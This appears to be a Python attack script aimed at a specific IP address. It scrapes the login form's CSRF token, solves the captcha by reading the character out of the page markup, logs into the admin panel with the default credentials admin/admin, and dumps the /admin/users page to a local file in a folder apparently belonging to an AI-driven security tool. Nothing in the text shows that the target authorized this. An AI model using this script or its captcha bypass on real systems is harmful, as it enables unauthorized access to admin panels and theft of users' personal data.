#!/usr/bin/env python3
"""
Extract full content of /admin/users
"""

import requests
import re

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Login
r = sess.get(TARGET + "/admin/login")
token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
if token_match:
    token = token_match.group(1)
    r = sess.get(TARGET + "/admin/captcha")
    captcha_match = re.search(r'<text[^>]*>(\w)</text>', r.text)
    if captcha_match:
        captcha = captcha_match.group(1)
        r = sess.post(TARGET + "/admin/login", data={
            'username': 'admin',
            'password': 'admin',
            'captcha': captcha,
            '_token': token
        })
        
        # Access users page
        r = sess.get(TARGET + "/admin/users")
        
        # Save to file
        with open('/mnt/c/Users/Administrator/Desktop/JySecAI/admin_users.html', 'w', encoding='utf-8') as f:
            f.write(r.text)
        
        print("=== Content of /admin/users ===")
        print(r.text)